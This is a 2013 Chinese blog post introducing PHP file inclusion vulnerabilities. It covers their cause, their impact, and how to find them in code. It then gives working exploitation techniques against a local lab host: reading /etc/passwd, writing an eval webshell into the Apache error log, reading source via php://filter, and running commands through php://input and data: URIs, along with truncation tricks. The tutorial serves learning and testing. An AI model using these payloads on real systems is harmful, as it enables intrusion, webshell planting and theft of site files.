---
layout: post
title: "文件包含科普"
date: 2013-11-08 22:59:35 +0800
comments: true
categories: 
---
<h4>1.形成原因</h4>
使用动态文件包含且变量没有过滤

<h4>2.造成影响</h4>
2.1暴露重要文件
2.2获取网站权限

<h4>3.漏洞挖掘</h4>
3.1 黑盒测试用WVS等扫描器扫描 
3.2 白盒测试在代码中寻找include()、include_once()、require()、require_once()这几个函数以及和这几个函数相关的变量

<h4>4.利用技巧(测试环境 apache2.2 php5.3)</h4>
4.1 查看重要文件../etc/passwd实例见 
http://www.wooyun.org/bugs/wooyun-2013-028410 
4.2 Apache错误日志写入一句话首先找到错误日志的位置
VulDrill/../logs/apache_error.log然后构造错误访问http://192.168.199.170/VulDrill/fi.php?f=<?php @eval($_POST[‘zero’]);?> 最后在VulDrill/../logs/apache_error.log链接webshell即可

4.3 利用 php://filter
读取php文件
http://192.168.199.170/VulDrill/fi.php?f=php://filter/read=convert.base64-encode/resource=database.php 
![图片](http://x2knowblog.qiniudn.com/aa.jpg)得到base64编码后一段内容，base64解码即可
![图片](http://x2knowblog.qiniudn.com/aaa.jpg)

4.4 利用 php://input 执行代码
php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。 ![](http://x2knowblog.qiniudn.com/blogQQ%E6%88%AA%E5%9B%BE20140212203325.jpg)

4.5 利用data:URI schema执行代码
http://192.168.199.170/VulDrill/fi.php?f=data:text/plain,<?php%20system('cd')?> 
http://192.168.199.170/VulDrill/fi.php?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjZCcpPz4=
4.6 当代码是后面这种形式时：<?php include($a.“.php”); ?> 需要用到截断技术
4.6.1 %00截断，这种有gpc=off和php版本限制
4.6.2 .或者./或者\或者/截断（多次重复) 
乌云实例 http://www.wooyun.org/bugs/wooyun-2010-08824

4.7其他利用方法
远程文件包含 http://developer.51cto.com/art/201104/255224.htm 
Linux包含/proc/self/environ环境变量 http://www.myhack58.com/Article/html/3/62/2011/32008.htm

**参考**
http://zone.wooyun.org/content/2196 
http://danqingdani.blog.163.com/blog/static/1860941952013993810261/ 
http://www.php.net/manual/zh/wrappers.php.php